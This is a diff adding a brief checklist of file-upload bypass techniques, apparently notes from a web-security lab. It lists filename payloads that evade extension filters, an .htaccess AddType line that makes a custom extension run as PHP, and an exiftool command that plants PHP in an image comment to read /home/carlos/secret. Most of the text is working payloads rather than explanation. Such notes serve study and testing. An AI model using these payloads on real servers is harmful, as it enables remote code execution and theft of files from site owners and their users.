@@ -1,0 +1,15 @@
+
+Checklist file upload:
+exploit.php.jpg
+exploit.php.
+exploit%2Ephp
+exploit.asp;.jpg or exploit.asp%00.jpg
+exploit.p.phphp
+
+updating .htaccess file, to include randome file extension and execute as PHP
+
+AddType application/x-httpd-php .l33t
+
+
+Creating Polygot image file # exiftool usage
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" img12.png -o polyglot.php
